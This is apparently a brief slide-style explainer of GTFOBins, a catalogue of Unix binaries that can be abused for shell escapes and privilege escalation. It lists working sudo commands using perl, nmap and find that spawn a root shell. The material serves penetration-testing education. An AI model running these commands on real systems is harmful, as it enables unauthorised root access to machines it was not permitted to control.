GTFOBins: Your Exploitation Playbook

A comprehensive database for leveraging binaries for privilege escalation.

What is GTFOBins?

GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions, often for privilege escalation.

  • •**Shell Escapes:** Provides commands to spawn shells from various programs.
  • •**Arbitrary Command Execution:** Shows how to run any command with elevated privileges.
  • •**Privilege Escalation:** Specific methods to gain root or other user privileges.
Key Takeaway

GTFOBins is an indispensable resource for finding concrete exploitation commands for vulnerable binaries.

GTFOBins Examples

`perl` with `NOPASSWD`

`sudo perl -e 'exec "/bin/sh";'`

`nmap` with `NOPASSWD`

`sudo nmap --interactive` then type `!sh`

`find` with `NOPASSWD`

`sudo find . -exec /bin/sh -p \;`

Important Note

Always test these commands in a controlled lab environment first. Syntax can be sensitive to shell and binary versions.
